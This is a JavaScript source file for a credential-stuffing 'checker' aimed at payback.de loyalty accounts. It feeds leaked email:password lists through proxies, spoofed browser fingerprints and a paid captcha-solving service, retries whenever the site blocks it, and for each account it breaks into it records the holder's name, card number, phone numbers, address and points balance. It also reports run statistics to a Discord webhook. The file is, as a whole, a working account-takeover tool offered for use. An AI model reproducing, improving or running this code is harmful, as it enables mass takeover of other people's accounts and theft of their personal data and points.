import { randomUUID } from "crypto";
import { readFile, writeFile, mkdir } from "node:fs/promises";
import pLimit from "p-limit";
import { getBalance, getSolveStats, solveCaptcha } from "./utils/captcha.js";
import { BufferedWriter } from "./utils/writer.js";
import { freeSession, tlsRequest } from "./crypto/tls.js";
import config from "./configloader.js";
import { updateFile } from "./utils/updater.js";
import {
  addCheckTimestamp,
  getAveragePoints,
  getCPM,
  getETA,
  getHighestPoint,
  getHitRate,
  getRecentHitsForRow,
  stats,
} from "./utils/stats.js";
import {
  blank,
  formatElapsed,
  G,
  getAverageProxyUsage,
  getCurrentProxy,
  getResultsFolder,
  getTime,
  getValue,
  incrementBlockError,
  isRetryableError,
  isStickyProxy,
  line,
  R,
  row,
  shuffleHeaderOrder,
  waitForActiveTasks,
  Y,
} from "./utils/helper.js";

let skipsWriter;
let successWriter;
let failedsWriter;

let recentHits = [];

const limit = pLimit(config.concurrency);

const VERSION = "3.1";
const MAX_RETRIES = 10;

async function processLine(line) {
  const [email, password] = line.split(":");

  if (!email || !password || password.length < 8 || !/^.+@.+\..+$/.test(email)) {
    failedsWriter.push(`INVALID_FORMAT | ${line}`);
    stats.failed++;
    return;
  }

  let sessionId = null;
  let captchaMandatoryCount = 0;

  let csrfToken = null;
  let jwtToken = null;
  let captchaToken = null;

  let reuseSession = false;
  let lastSessionId = null;

  for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
    try {
      if (reuseSession && lastSessionId) {
        sessionId = lastSessionId;
      } else {
        sessionId = randomUUID();
        reuseSession = false;
      }

      lastSessionId = sessionId;

      if (!reuseSession) {
        const getLogin = await tlsRequest({
          debug: config.debug,
          version: VERSION,
          proxy: getCurrentProxy(config),
          API_KEY: config.server.apiKey,
          sessionId,
          url: "https://www.payback.de/login?redirectUrl=https%3A%2F%2Fwww.payback.de%2Fpunktekonto",
          method: "GET",
          headers: {
            Accept:
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
            Connection: "keep-alive",
            Host: "www.payback.de",
            Referer: "https://www.payback.de/punktekonto",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
            // "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
          },
          headerOrder: [
            "Accept",
            "Accept-Encoding",
            "Accept-Language",
            "Connection",
            "Host",
            "Referer",
            "Sec-Fetch-Dest",
            "Sec-Fetch-Mode",
            "Sec-Fetch-Site",
            "Upgrade-Insecure-Requests",
            // "User-Agent",
            "sec-ch-ua",
            "sec-ch-ua-mobile",
            "sec-ch-ua-platform",
          ],
        });

        try {
          const match = getLogin.body.match(/name="csrf_token"\s+content="([^"]+)"/);
          csrfToken = match[1];
        } catch (error) {
          throw new Error(`${getLogin.statusReq} ${getLogin.body} LOGIN_GET`);
        }

        const jwtMatch = getLogin.body.match(/loginConfigJwt&#034;:&#034;([A-Za-z0-9._-]+)&#034;/);
        jwtToken = jwtMatch[1];

        captchaToken = await solveCaptcha({
          service: config.captcha.service,
          apiKey: config.captcha.apiKey,
          siteKey: "6LeE-B8UAAAAADot-Vz7dAQ_5jXunhPg8qPzwMXa",
          url: "https://www.payback.de/login",
          debug: config.debug,
        });
        stats.solve++;
      }
      const postLogin = await tlsRequest({
        debug: config.debug,
        proxy: getCurrentProxy(config),
        version: VERSION,
        API_KEY: config.server.apiKey,
        sessionId,
        url: "https://www.payback.de/ajax/login/authenticate/29336",
        method: "POST",
        headers: {
          Accept: "*/*",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Accept-Language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
          Connection: "keep-alive",
          Host: "www.payback.de",
          Origin: "https://www.payback.de",
          Referer:
            "https://www.payback.de/login?redirectUrl=https%3A%2F%2Fwww.payback.de%2Fpunktekonto&adobe_mc_ref=https%3A%2F%2Fwww.payback.de%2Fpunktekonto",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
          "content-type": "application/json",
          pageid: "4506",
          "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "x-site-name": "payback-main-page",
          "x-xsrf-token": csrfToken,
        },
        headerOrder: shuffleHeaderOrder([
          "Accept",
          "Accept-Encoding",
          "Accept-Language",
          "Connection",
          "Content-Length",
          "Cookie",
          "Host",
          "Origin",
          "Referer",
          "Sec-Fetch-Dest",
          "Sec-Fetch-Mode",
          "Sec-Fetch-Site",
          "User-Agent",
          "content-type",
          "pageid",
          "sec-ch-ua",
          "sec-ch-ua-mobile",
          "sec-ch-ua-platform",
          "x-site-name",
          "x-xsrf-token",
        ]),
        body: JSON.stringify({
          referrerUrl:
            "https://www.payback.de/login?redirectUrl=https%3A%2F%2Fwww.payback.de%2Fpunktekonto",
          loginMethod: "pwd",
          permLogin: false,
          alias: email,
          password: password,
          captcha: captchaToken,
          loginConfigJwt: jwtToken,
        }),
      });

      if (postLogin.statusReq !== 200) {
        if (postLogin.statusReq === 403) {
          incrementBlockError();
          stats.postRetry++;
        }
        if (postLogin.statusReq === 0 || postLogin.statusReq === 403) {
          if (attempt < MAX_RETRIES) {
            if (config.debug) {
              console.warn(
                `\x1b[33m[${getTime()}] [RETRY ${attempt}/${MAX_RETRIES}] ${email}:${password}\x1b[0m | ${postLogin.statusReq} ${postLogin.body} LOGIN_POST_RETRY`,
              );
            }
            reuseSession = true;
            stats.retry++;
            continue;
          }
        }
        throw new Error(`${postLogin.statusReq} ${postLogin.body} LOGIN_POST`);
      }

      if (postLogin.body.includes("/login/pending")) {
        throw new Error("2FA");
      }

      const getSecurityCheck = await tlsRequest({
        debug: config.debug,
        version: VERSION,
        proxy: getCurrentProxy(config),
        API_KEY: config.server.apiKey,
        sessionId,
        url: "https://www.payback.de/login/securitycheck?redirectUrl=https%3A%2F%2Fwww.payback.de%2Fpunktekonto",
        method: "GET",
        headers: {
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Accept-Language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
          Connection: "keep-alive",
          Host: "www.payback.de",
          Referer:
            "https://www.payback.de/login?redirectUrl=https%3A%2F%2Fwww.payback.de%2Fpunktekonto&adobe_mc_ref=https%3A%2F%2Fwww.payback.de%2Fpunktekonto",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "same-origin",
          "Sec-Fetch-User": "?1",
          "Upgrade-Insecure-Requests": "1",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
          "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
        },
        headerOrder: [
          "Accept",
          "Accept-Encoding",
          "Accept-Language",
          "Connection",
          "Cookie",
          "Host",
          "Referer",
          "Sec-Fetch-Dest",
          "Sec-Fetch-Mode",
          "Sec-Fetch-Site",
          "Sec-Fetch-User",
          "Upgrade-Insecure-Requests",
          "User-Agent",
          "sec-ch-ua",
          "sec-ch-ua-mobile",
          "sec-ch-ua-platform",
        ],
      });

      let csrfTokenNew;
      try {
        const match = getSecurityCheck.body.match(/name="csrf_token"\s+content="([^"]+)"/);
        csrfTokenNew = match[1];
      } catch (error) {
        throw new Error(
          `${getSecurityCheck.statusReq} ${getSecurityCheck.body} SECURITY_CHECK_GET`,
        );
      }

      const getUser = await tlsRequest({
        debug: config.debug,
        proxy: getCurrentProxy(config),
        version: VERSION,
        API_KEY: config.server.apiKey,
        sessionId,
        url: "https://www.payback.de/ajax/common/initialize/user",
        method: "GET",
        headers: {
          Accept: "*/*",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Accept-Language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
          Connection: "keep-alive",
          Host: "www.payback.de",
          pageId: "4506",
          Referer: "https://www.payback.de/info/mein-payback/stammdaten",
          "sec-ch-ua": `"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"`,
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"Windows"',
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
          "X-Requested-With": "XMLHttpRequest",
          "X-SITE-NAME": "payback-main-page",
          "X-XSRF-TOKEN": csrfTokenNew,
        },
        headerOrder: [
          "Accept",
          "Accept-Encoding",
          "Accept-Language",
          "Connection",
          "Cookie",
          "Host",
          "Referer",
          "Sec-Fetch-Dest",
          "Sec-Fetch-Mode",
          "Sec-Fetch-Site",
          "User-Agent",
          "X-Requested-With",
          "X-SITE-NAME",
          "X-XSRF-TOKEN",
          "pageId",
          "sec-ch-ua",
          "sec-ch-ua-mobile",
          "sec-ch-ua-platform",
        ],
      });

      let userData;

      try {
        userData = JSON.parse(getUser.body);
      } catch (error) {
        throw new Error(`${getUser.statusReq} ${getUser.body} USER_DATA_GET`);
      }

      if (getUser.statusReq !== 200) {
        throw new Error(`${getUser.statusReq} ${getUser.body} USER_DATA_GET_PARSED`);
      }

      const raw = userData.points.availablePoints;

      const points = parseFloat(raw.split(" ")[0].replace(".", ""));

      recentHits.unshift(`${email} | ${points}`);
      if (recentHits.length > 3) recentHits.pop();

      stats.pointsSum += points;
      if (points > stats.highestPoints) {
        stats.highestPoints = points;
      }

      const result =
        `${email}:${password} | ` +
        `Salutation: ${getValue(userData.salutation)} | ` +
        `Title: ${getValue(userData.title)} | ` +
        `FirstName: ${getValue(userData.firstName)} | ` +
        `LastName: ${getValue(userData.lastName)} | ` +
        `CardNumber: ${getValue(userData.card.cardnumber)} | ` +
        `Telephone: ${getValue(userData.contact.telephone)} | ` +
        `MobilePhone: ${getValue(userData.contact.mobilePhone)} | ` +
        `Street: ${getValue(userData.address.street)} | ` +
        `AdditionalAddress: ${getValue(userData.address.additionalAddress)} | ` +
        `ZipCode: ${getValue(userData.address.zipCode)} | ` +
        `City: ${getValue(userData.address.city)} | ` +
        `Country: ${getValue(userData.address.country)} | ` +
        `Points: ${getValue(userData.points.availablePoints)}`;

      successWriter.push(result);
      stats.success++;
      if (config.debug) {
        console.log(`\x1b[32m[${getTime()}] [OK] ${email}:${password}\x1b[0m`);
      }
      addCheckTimestamp();
      await freeSession({
        version: VERSION,
        sessionId,
        API_KEY: config.server.apiKey,
      });
      return;
    } catch (err) {
      const msg = err.message.toLowerCase();
      const isCaptchaMandatory = msg.includes("captchamandatory");

      if (msg.includes("403") || msg.includes("robots")) {
        incrementBlockError();
        if (err.message.includes("LOGIN_GET")) stats.getRetry++;
      }

      if (isCaptchaMandatory) {
        captchaMandatoryCount++;
      }

      if (sessionId) {
        await freeSession({
          version: VERSION,
          sessionId,
          API_KEY: config.server.apiKey,
        });
      }

      if (
        (isRetryableError(err.message) || err.message.startsWith("0")) &&
        attempt < MAX_RETRIES &&
        (!isCaptchaMandatory || captchaMandatoryCount <= 1)
      ) {
        stats.retry++;
        if (config.debug) {
          console.warn(
            `\x1b[33m[${getTime()}] [RETRY ${attempt}/${isCaptchaMandatory ? 1 : MAX_RETRIES}] ${email}:${password}\x1b[0m | ${err.message}`,
          );
        }

        continue;
      }
      addCheckTimestamp();

      if (
        /<[^>]+>/.test(err.message) ||
        err.message.startsWith("0") ||
        msg.includes("403") ||
        msg.includes("captcha not solved")
      ) {
        skipsWriter.push(`${email}:${password}${config.debug ? ` | ${err.message}` : ""}`);
        stats.skipp++;
        if (config.debug) {
          console.warn(
            `\x1b[33m[${getTime()}] [SKIP] ${email}:${password}\x1b[0m | ${err.message}`,
          );
        }
        return;
      } else {
        failedsWriter.push(`${email}:${password} | ${err.message}`);
        stats.failed++;
        if (config.debug) {
          console.error(
            `\x1b[31m[${getTime()}] [FAIL] ${email}:${password}\x1b[0m | ${err.message}`,
          );
        }
        return;
      }
    }
  }
  return;
}

let shuttingDown = false;

async function shutdown(reason) {
  if (shuttingDown) return;
  shuttingDown = true;
  const processed0 = stats.success + stats.failed + stats.skipp;

  if (config.debug ? true : processed0 < 10) {
    console.warn(`\n\x1b[33m[${getTime()}] [SHUTDOWN] Aborted…\x1b[0m\n`);
    process.exit(1);
  }
  console.warn(
    `\n\x1b[33m[${getTime()}] [SHUTDOWN] ${reason} clearing queue, waiting for active tasks…\x1b[0m\n`,
  );

  limit.clearQueue();
  await waitForActiveTasks(limit);

  await Promise.allSettled([successWriter.close(), failedsWriter.close(), skipsWriter.close()]);

  stats.endBalance =
    (await getBalance({
      service: config.captcha.service,
      apiKey: config.captcha.apiKey,
    })) || 0;

  const cpm = getCPM();
  const elapsed = formatElapsed(Date.now() - stats.startTime);
  const captchaStats = getSolveStats();
  const processed = stats.success + stats.failed + stats.skipp;
  const recentHitsRow = getRecentHitsForRow(recentHits);
  const showRecentHits = recentHitsRow && recentHitsRow.length > 0;

  console.log(`\n\n
${line}
 [${getTime()}] ⏱️ ${" " + elapsed}
${line}
${blank}
${row([
  ["📦", "All", stats.all],
  ["⚙️", "Check", ` ${stats.total}`],
  ["📋", "Check done", processed],
  ["📄", "Lines Skipped", config.skipLines],
  ["🚀", "Concurrency", config.concurrency],
])}
${blank}
${line}
${blank}
${row([
  [`${G}✔${R}`, " Success", stats.success],
  [`${Y}✘${R}`, " Failed", stats.failed],
  [`${Y}⏭${R}`, " Skips", stats.skipp],
  [`${Y}↻${R}`, " Retries", stats.retry],
])}
${blank}
${line}
${blank}
${row([
  ["⭐", "Avg Pts", getAveragePoints()],
  ["📈", "Overall Pts", stats.pointsSum],
  ["🏆", "Highest", getHighestPoint()],
  ["⚡", "CPM", cpm],
  ["🎯", "Hit Rate", getHitRate()],
])}
${blank}
${line}
${blank}
${row([
  ["🟢", "Captcha Start", `${stats.startBalance}$`],
  ["🔴", "Captcha End", `${stats.endBalance}$`],
  ["📉", "Used", `${(stats.startBalance - stats.endBalance).toFixed(4)}$`],
  ["✅", "Solves", stats.solve],
  ["🤖", "Avg Solve Time", `${captchaStats.avgSolveTimeSeconds}s`],
])}
${blank}
${line}
${
  showRecentHits
    ? `${blank}
${row(recentHitsRow)}
${blank}
${line}`
    : ""
}
\n\n
`);

  process.exit(1);
}

process.on("SIGINT", () => shutdown("SIGINT"));
process.on("SIGTERM", () => shutdown("SIGTERM"));

async function main() {
  console.log(`\n\x1b[36m[${getTime()}] [INFO] Testing server connection...\x1b[0m`);
  console.log(
    `\x1b[33m[${getTime()}] [INFO] Join \x1b[33m@ilandboys\x1b[0m\x1b[33m right now\x1b[0m`,
  );

  let getTest;
  try {
    getTest = await tlsRequest({
      debug: config.debug,
      version: VERSION,
      proxy: getCurrentProxy(config),
      API_KEY: config.server.apiKey,
      url: "https://api.ipify.org",
      method: "GET",
    });
  } catch (error) {
    if (error.message.includes("invalid")) {
      throw new Error(error.message);
    } else if (error.message.includes("mismatch")) {
      throw new Error(error.message);
    } else if (error.message.includes("version")) {
      try {
        console.log(`\x1b[36m[${getTime()}] [INFO] Updating client...\x1b[0m`);

        await updateFile({ filename: "updatedChecker.mjs" });

        console.log(`\n\x1b[32m[${getTime()}] [INFO] Updated successful.\x1b[0m`);

        console.log(
          `\x1b[31m[${getTime()}] [INFO] Delete "checker" and rename "updatedChecker" to "checker"\x1b[0m\n`,
        );

        process.exit(1);
      } catch (error) {
        throw new Error(error.message);
      }
    } else {
      throw new Error(
        `Failed to connect to the server. Please check your network. ${error.message}`,
      );
    }
  }
  if (getTest.statusReq !== 200) {
    throw new Error(
      "The proxy is not responding correctly. Please check if you have any bandwidth left.",
    );
  }

  console.log(`\n\x1b[32m[${getTime()}] [INFO] Server connection successful.\n\x1b[0m`);
  const skipLines = config.skipLines;

  let raw;
  try {
    raw = await readFile("input.txt", "utf-8");
  } catch (err) {
    if (err.code === "ENOENT") {
      await writeFile("input.txt", "");
      throw new Error("input.txt was not found. An empty file has been created.");
    }
  }
  const alllines = raw.split("\n");

  let lines = raw
    .split("\n")
    .slice(skipLines)
    .map((l) => l.trim())
    .filter(Boolean);

  const beforeDedupe = lines.length;
  if (!config.debug) lines = [...new Set(lines)];

  if (skipLines >= alllines.length) {
    throw new Error(
      `Skip lines (${skipLines}) exceeds total line count (${alllines.length}). Lower skip lines`,
    );
  }
  if (lines.length === 0) {
    throw new Error("input.txt is empty — maybe you forgot to save your data?");
  }

  stats.total = lines.length;
  stats.all = lines.length + skipLines;

  const res = await getBalance({
    service: config.captcha.service,
    apiKey: config.captcha.apiKey,
  });

  if (res) {
    stats.startBalance = res;

    const rate = config.captcha.service === "capmonster" ? 0.6 : 0.5;
    const available = res;

    if (available <= 0) {
      throw new Error(`Captcha balance too low.`);
    }

    const affordableLines = Math.floor((available / rate) * 1000);

    if (affordableLines <= 0) {
      throw new Error(`Captcha balance insufficient for any lines.`);
    }

    if (affordableLines < lines.length) {
      const originalCount = lines.length;
      lines = lines.slice(0, affordableLines);
      stats.total = lines.length;
      stats.all = lines.length + skipLines;
      console.warn(
        `\n\x1b[31m[${getTime()}] [INFO] Balance $${res} only covers ${stats.total}.\x1b[0m\n`,
      );
    }
  } else {
    throw new Error("Invalid captcha API key or no balance available.");
  }

  const resultsDir = getResultsFolder();
  await mkdir(`output/${resultsDir}`, { recursive: true });

  const resultsPath = `output/${resultsDir}/results.txt`;
  const failedsPath = `output/${resultsDir}/faileds.txt`;
  const skipsPath = `output/${resultsDir}/skips.txt`;

  await Promise.all([
    writeFile(skipsPath, "", { flag: "w" }),
    writeFile(resultsPath, "", { flag: "w" }),
    writeFile(failedsPath, "", { flag: "w" }),
  ]);

  skipsWriter = new BufferedWriter(skipsPath, {
    maxSize: 100,
    flushInterval: 10000,
  });
  successWriter = new BufferedWriter(resultsPath, {
    maxSize: 100,
    flushInterval: 10000,
  });
  failedsWriter = new BufferedWriter(failedsPath, {
    maxSize: 100,
    flushInterval: 10000,
  });

  setInterval(
    () => {
      if (shuttingDown) return;
      const processed = stats.success + stats.failed + stats.skipp;
      if (processed == stats.total) {
        return;
      }
      const cpm = getCPM();
      const captchaStats = getSolveStats();

      const elapsed = formatElapsed(Date.now() - stats.startTime);
      const recentHitsRow = getRecentHitsForRow(recentHits);
      const showRecentHits = recentHitsRow && recentHitsRow.length > 0;
      console.log(`\n
${line}
 [${getTime()}] ⏱️ ${" " + elapsed}
${line}
${blank}
${row([
  ["📦", "All", stats.all],
  ["⚙️", "Checking", `${stats.total}`],
  ["📋", "Done", processed],
  ["📄", "Lines To Skip", config.skipLines],
  ["🚀", "Concurrency", config.concurrency],
])}
${blank}
${line}
${blank}
${row([
  [`${G}✔${R}`, " Success", stats.success],
  [`${Y}✘${R}`, " Failed", stats.failed],
  [`${Y}⏭${R}`, " Skips", stats.skipp],
  [`${Y}↻${R}`, " Retries", stats.retry],
])}
${blank}
${line}
${blank}
${row([
  ["⭐", "Avg Pts", getAveragePoints()],
  ["🏆", "Highest", getHighestPoint()],
  ["📈", "Overall Pts", stats.pointsSum],
  ["⚡", "CPM", cpm],
  ["🎯", "Hit Rate", getHitRate()],
  ["⏱️", "ETA", getETA()],
  ["🤖", "Avg Solve Time", `${captchaStats.avgSolveTimeSeconds}s`],
])}
${blank}
${line}
${
  showRecentHits
    ? `${blank}
${row(recentHitsRow)}
${blank}
${line}`
    : ""
}
\n
`);

      if (config.debug) {
        console.log(
          `\n\x1b[36m[CONCURRENCY] Active: ${limit.activeCount} | Pending: ${limit.pendingCount}\x1b[0m\n`,
        );
      }
    },

    config.debug ? 10000 : 1000,
  ).unref();

  setInterval(
    async () => {
      if (shuttingDown) return;
      const processed = stats.success + stats.failed + stats.skipp;
      if (processed == stats.total) return;

      const elapsed = formatElapsed(Date.now() - stats.startTime);
      const cpm = getCPM();

      const res = await getBalance({
        service: config.captcha.service,
        apiKey: config.captcha.apiKey,
      });

      const captchaStats = getSolveStats();

      const embed = {
        title: `📊 Stats Update — ${elapsed}`,
        color: 0x5865f2,
        fields: [
          { name: "📦 All", value: `${stats.all}`, inline: true },
          { name: "⚙️ Checking", value: `${stats.total}`, inline: true },
          { name: "📋 Done", value: `${processed}`, inline: true },
          { name: "✔️ Success", value: `${stats.success}`, inline: true },
          { name: "✘ Failed", value: `${stats.failed}`, inline: true },
          { name: "⏭ Skips", value: `${stats.skipp}`, inline: true },
          { name: "↻ Retries", value: `${stats.retry}`, inline: true },
          { name: "⭐ Avg Pts", value: `${getAveragePoints()}`, inline: true },
          { name: "🏆 Highest", value: `${getHighestPoint()}`, inline: true },
          { name: "📈 Overall Pts", value: `${stats.pointsSum}`, inline: true },
          { name: "⚡ CPM", value: `${cpm}`, inline: true },
          { name: "🎯 Hit Rate", value: `${getHitRate()}`, inline: true },
          { name: "⏱️ ETA", value: `${getETA()}`, inline: true },
          { name: "🧵 Threads", value: `${config.concurrency}`, inline: true },
          { name: "🟢 Captcha Start", value: `${stats.startBalance}$`, inline: true },
          { name: "🔴 Captcha Now", value: `${res}$`, inline: true },
          { name: "📉 Used", value: `${(stats.startBalance - res).toFixed(4)}$`, inline: true },
          { name: "✅ Solves", value: `${stats.solve}`, inline: true },
          {
            name: "🤖 Avg Solve Time",
            value: `${captchaStats.solveCount} solves with ${captchaStats.avgSolveTimeSeconds}s average ${config.captcha.service}`,
            inline: true,
          },
          {
            name: "🔁 Blocks",
            value: `LOGIN_GET: ${stats.getRetry} | LOGIN_POST: ${stats.postRetry}`,
            inline: true,
          },
        ],
        footer: { text: `${config.server.apiKey}` },
        timestamp: new Date().toISOString(),
      };

      const embed2 = {
        title: `📊 Stats Update — ${elapsed}`,
        color: 0x57f287,
        fields: [
          { name: "🌐 Proxy (only for support)", value: `${config.proxy}`, inline: true },

          { name: "🌐 Average Usage", value: `${getAverageProxyUsage()}`, inline: true },
        ],
        footer: { text: `${config.server.apiKey}` },
        timestamp: new Date().toISOString(),
      };

      try {
        await fetch(
          "DISCORD_WEBHOOK",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed, embed2] }),
          },
        );
      } catch (e) {}
    },
    config.debug ? 5000 : 60000,
  ).unref();

  console.log(
    `\x1b[91m[${getTime()}] [INFO] Starting checks
    Concurrency: ${config.concurrency}
    Lines: ${stats.total}
    Starting balance: $${stats.startBalance}
    Proxy mode: ${isStickyProxy(config.proxy) ? "sticky" : "rotating"}\x1b[0m`,
  );

  const tasks = lines.map((line, i) =>
    limit(async () => {
      if (i < config.concurrency) {
        await new Promise((r) => setTimeout(r, i * 150));
      }
      return processLine(line);
    }),
  );

  await Promise.allSettled(tasks);

  await Promise.allSettled([successWriter.close(), failedsWriter.close(), skipsWriter.close()]);

  stats.endBalance =
    (await getBalance({
      service: config.captcha.service,
      apiKey: config.captcha.apiKey,
    })) || 0;

  const cpm = getCPM();
  const elapsed = formatElapsed(Date.now() - stats.startTime);
  const captchaStats = getSolveStats();

  const processed = stats.success + stats.failed + stats.skipp;
  const recentHitsRow = getRecentHitsForRow(recentHits);
  const showRecentHits = recentHitsRow && recentHitsRow.length > 0;
  console.log(`\n\n
${line}
 [${getTime()}] ⏱️ ${" " + elapsed}
${line}
${blank}
${row([
  ["📦", "All", stats.all],
  ["⚙️", "Check", ` ${stats.total}`],
  ["📋", "Check done", processed],
  ["📄", "Lines Skipped", config.skipLines],
  ["🚀", "Concurrency", config.concurrency],
])}
${blank}
${line}
${blank}
${row([
  [`${G}✔${R}`, " Success", stats.success],
  [`${Y}✘${R}`, " Failed", stats.failed],
  [`${Y}⏭${R}`, " Skips", stats.skipp],
  [`${Y}↻${R}`, " Retries", stats.retry],
])}
${blank}
${line}
${blank}
${row([
  ["⭐", "Avg Pts", getAveragePoints()],
  ["📈", "Overall Pts", stats.pointsSum],
  ["🏆", "Highest", getHighestPoint()],
  ["⚡", "CPM", cpm],
  ["🎯", "Hit Rate", getHitRate()],
])}
${blank}
${line}
${blank}
${row([
  ["🟢", "Captcha Start", `${stats.startBalance}$`],
  ["🔴", "Captcha End", `${stats.endBalance}$`],
  ["📉", "Used", `${(stats.startBalance - stats.endBalance).toFixed(4)}$`],
  ["✅", "Solves", stats.solve],
  ["🤖", "Avg Solve Time", `${captchaStats.avgSolveTimeSeconds}s`],
])}
${blank}
${line}
${
  showRecentHits
    ? `${blank}
${row(recentHitsRow)}
${blank}
${line}`
    : ""
}
\n\n
`);
  process.exit(1);
}

main().catch(async (err) => {
  console.log(`\n\x1b[31m[${getTime()}] [ERROR] ${err.message}\x1b[0m\n`);
  process.exit(1);
});
